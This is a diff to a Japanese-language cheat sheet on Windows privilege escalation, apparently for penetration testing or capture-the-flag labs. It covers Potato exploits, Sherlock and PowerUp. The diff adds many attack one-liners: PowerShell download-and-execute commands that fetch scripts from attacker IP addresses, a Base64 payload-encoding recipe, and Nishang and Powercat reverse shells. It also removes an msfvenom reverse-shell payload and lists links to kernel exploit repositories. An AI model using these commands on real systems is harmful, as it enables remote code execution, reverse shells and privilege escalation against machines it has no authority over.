@@ -2432,11 +2432,6 @@ CLSIDは、./juicy-potato/CLSID/から対応するOSを選択してUserが NT AU
 powershellが何かの理由により使用できない場合、JuicyPotato.exe(test_clsid.batの内容に合わせるためjuicypotato.exeに名前を変更)と./juicy-potato/CLSID/<対応するOS>/CLSID.list/、./juicy-potato/Test/test_clsid.batをターゲットマシンに配置してCLSIDを集める。  
 ターゲット端末でtest_clsid.batを5分間起動してから、出力されたresult.logを確認してCLSIDを取得する。  
 
-juicy-potato(x64):  
-https://github.com/ohpe/juicy-potato.git  
-juicy-potato(x86バイナリ):  
-https://github.com/ivanitlearning/Juicy-Potato-x86.git
-
 
 ## Token Impersonation - Rogue Potato
 「whoami /priv」コマンドを使用して、いずれかの権限を持っており「攻撃対象のマシンが >= Windows 10 1809 & Windows Server 2019 の場合」にRouge Potatoのエクスプロイトが機能する可能性がある。  
@@ -2468,9 +2463,6 @@ PrintSpoofer.exe -i -c powershell.exe
 ```
 などにより権限昇格可能。
 
-PrintSpoofer:  
-https://github.com/itm4n/PrintSpoofer.git
-
 ## Kernel Exploit
 ### 手動列挙
 ```
@@ -2494,7 +2486,11 @@ systeminfo > systeminfo.txt
 
 ### Sherlock.ps1
 ```
-Find-AllVulns
+# Find-Allchecks(powershell.exe)
+IEX(New-Object Net.WebClient).downloadstring('http://10.10.16.3:8000/Sherlock.ps1')
+
+# Find-AllVulns(cmd.exe)
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/Sherlock.ps1');Find-AllVulns | powershell -noprofile -
 ```
 
 ### Watson.ps1
@@ -2571,19 +2567,6 @@ echo %username%
 ```
 
 ### reverse_shell
-#### msfvenom
-```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe > shell.exe
-rlwrap nc -lvnp 4444
-```
-
-#### nishang
-```
-powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.252.239:9999/nishang.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.252.239 -Port 4444
-
-rlwrap nc -lvnp 4444
-```
-
 #### netcatを転送
 ```
 certutil.exe -urlcache -split -f "http://10.10.10.1/nc.exe" C:\Windows\Temp\nc.exe
@@ -2605,20 +2588,20 @@ powershell -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destinatio
 ```
 powershell "IEX(New-Object Net.webclient).downloadString('http://10.10.14.16:9001/nishang.ps1')"
 ```
-```
-被害者(受信側):
-# 共有ディレクトリの列挙
-net view \\10.10.14.11
-# 共有ディレクトリ内のファイルを列挙
-dir \\10.10.10.1\temp
-# ローカルにコピー
-copy \\10.10.10.1\temp\rs.exe rs.exe
-```
 
 ### SMBを用いたファイル共有
 ```
 攻撃側(送信側):
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp .
+```
+```
+被害者(受信側):
+# 共有ディレクトリの列挙
+net view \\10.10.10.1
+# 共有ディレクトリ内のファイルを列挙
+dir \\10.10.10.1\temp
+# ローカルにコピー
+copy \\10.10.10.1\temp\rs.exe rs.exe
 ```
 
 ### ファイルの検索
@@ -2629,13 +2612,51 @@ dir /s /b flag*
 - /s...サブフォルダまで含めたファイルまで検索対象とする
 - /b...ファイル名だけ表示
 
-## Powershell
-### Powershellスクリプトの実行
+## PowerShell
+### PowerShellスクリプトの実行
 ```
 現在のユーザーの実行ポリシーの確認:
 Get-ExecutionPolicy -Scope CurrentUser
 現在のユーザーの実行ポリシーの変更:
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+```
+
+#### PowerShellの場所
+```
+C:\windows\syswow64\windowspowershell\v1.0\powershell
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell
+```
+
+#### ダウンロードと実行
+
+```
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.1:8000/PowerUp.ps1')"
+
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.16.3:8000/PowerUp.ps1')|iex"
+
+# cmd.exe
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile -
+
+# PowerShell v3
+iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3
+```
+
+#### Base64 Encording
+```
+echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.1/PowerUp.ps1')" | iconv -t UTF-16LE | base64 -w 0
+powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
+```
+
+#### Nishang
+```
+powershell IEX (New-Object Net.WebClient).DownloadString('http://10.9.252.239:9999/nishang.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.1 -Port 4444
+
+C:> echo IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/nishang.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.1 -Port 4444 | powershell -noprofile -
+```
+
+#### Powercat
+```
+powershell -exec bypass -c "iwr('http://10.10.10.1:8000/powercat.ps1')|iex;powercat -c 10.10.10.1 -p 4444 -e cmd"
 ```
 
 ### PowerUp.ps1
@@ -2648,6 +2669,12 @@ PS C:\> Import-Module PowerUp.ps1
 
 # PowerUpの実行(All-Check関数を使用)
 PS C:\> Invoke-AllChecks 
+
+# Invoke-AllChecks(powershell.exe)
+IEX(New-Object Net.WebClient).downloadstring('http://10.10.10.1:8000/PowerUp.ps1');Invoke-AllChecks
+
+# Invoke-AllChecks(cmd.exe)
+C:> echo IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/PowerUp.ps1');Invoke-AllChecks | powershell -noprofile -
 ```
 
 ```
@@ -2656,7 +2683,7 @@ C:\> powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invok
 ```
 ```
 # ディスクに触れずにPowerUpを実行
-C:\> powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
+C:\> powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.1:8000/PowerUp.ps1'); Invoke-AllChecks"
 ```
 
 ## Metasploit
@@ -2719,14 +2746,22 @@ https://github.com/carlospolop/PEASS-ng
 PowerSploit(PowerUp.ps1):  
 https://github.com/PowerShellMafia/PowerSploit.git
 
-nishang:  
+Nishang:  
 https://github.com/samratashok/nishang.git
+
+Powercat:  
+https://github.com/besimorhino/powercat.git
+
+Sherlock:  
+https://github.com/rasta-mouse/Sherlock.git
 
 creddump7:  
 https://github.com/Tib3rius/creddump7
 
-juicy-potato:  
-https://github.com/ohpe/juicy-potato.git
+juicy-potato(x64):  
+https://github.com/ohpe/juicy-potato.git  
+juicy-potato(x86バイナリ):  
+https://github.com/ivanitlearning/Juicy-Potato-x86.git
 
 RoguePotato:  
 https://github.com/antonioCoco/RoguePotato.git
@@ -2782,6 +2817,9 @@ Juicy-potato(x64):
 https://github.com/ohpe/juicy-potato.git  
 Juicy-potato(x86バイナリ):  
 https://github.com/ivanitlearning/Juicy-Potato-x86.git
+
+MS15-051:
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
 
 MS16-098:
 https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098
